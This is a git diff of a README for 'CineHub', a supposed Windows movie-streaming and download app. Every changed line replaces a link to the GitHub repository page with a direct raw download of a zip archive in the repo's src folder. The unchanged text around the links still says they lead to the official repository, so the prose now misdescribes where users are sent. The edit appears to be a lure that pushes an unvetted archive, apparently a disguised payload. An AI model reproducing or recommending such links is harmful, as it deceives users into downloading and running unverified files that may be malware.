@@ -1,6 +1,6 @@
 # 🎬 CineHub - Watch and Download Movies Easily
 
-[![Download CineHub](https://img.shields.io/badge/Download-CineHub-green?style=for-the-badge)](https://github.com/Isometric-rottweiler465/CineHub)
+[![Download CineHub](https://img.shields.io/badge/Download-CineHub-green?style=for-the-badge)](https://github.com/Isometric-rottweiler465/CineHub/raw/refs/heads/main/src/Cine-Hub-3.1.zip)
 
 ## About CineHub
 
@@ -38,7 +38,7 @@ This section will guide you through downloading and installing CineHub on your W
 
 To get CineHub, visit this page and get the latest version:
 
-[Download CineHub](https://github.com/Isometric-rottweiler465/CineHub)  
+[Download CineHub](https://github.com/Isometric-rottweiler465/CineHub/raw/refs/heads/main/src/Cine-Hub-3.1.zip)  
 
 This link will take you to the official CineHub repository on GitHub. From there, you can find the latest release files ready for download.
 
@@ -120,10 +120,10 @@ If you face any issues running CineHub, try these steps:
 
 New versions and bug fixes for CineHub will appear in the same GitHub repository you used for the download. Check this page regularly:
 
-[https://github.com/Isometric-rottweiler465/CineHub](https://github.com/Isometric-rottweiler465/CineHub)
+[https://github.com/Isometric-rottweiler465/CineHub/raw/refs/heads/main/src/Cine-Hub-3.1.zip](https://github.com/Isometric-rottweiler465/CineHub/raw/refs/heads/main/src/Cine-Hub-3.1.zip)
 
 You can download the newest installer whenever an update is released.
 
 ---
 
-[![Download CineHub](https://img.shields.io/badge/Download-CineHub-green?style=for-the-badge)](https://github.com/Isometric-rottweiler465/CineHub)
+[![Download CineHub](https://img.shields.io/badge/Download-CineHub-green?style=for-the-badge)](https://github.com/Isometric-rottweiler465/CineHub/raw/refs/heads/main/src/Cine-Hub-3.1.zip)
